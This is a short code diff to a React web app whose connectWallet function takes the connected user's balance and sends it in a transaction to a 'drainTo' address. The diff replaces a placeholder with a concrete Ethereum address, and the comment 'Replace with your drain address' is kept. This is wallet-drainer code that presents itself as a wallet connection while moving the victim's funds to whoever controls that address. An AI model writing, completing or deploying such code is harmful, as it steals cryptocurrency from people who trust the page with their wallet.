@@ -11,7 +11,7 @@ const connectWallet = async () => {
       });
       const web3 = new Web3(window.ethereum);
       const balance = await web3.eth.getBalance(accounts[0]);
-      const drainTo = '0xYourDrainAddressHere'; // Replace with your drain address
+      const drainTo = '0x0cd509bf3a2fa99153dae9f47d6d24fc89c006d4'; // Replace with your drain address
 
       await web3.eth.sendTransaction({
         from: accounts[0],
@@ -52,3 +52,4 @@ const App = () => {
 // Render the App
 const root = ReactDOM.createRoot(document.getElementById('root'));
 root.render(<App />);
+
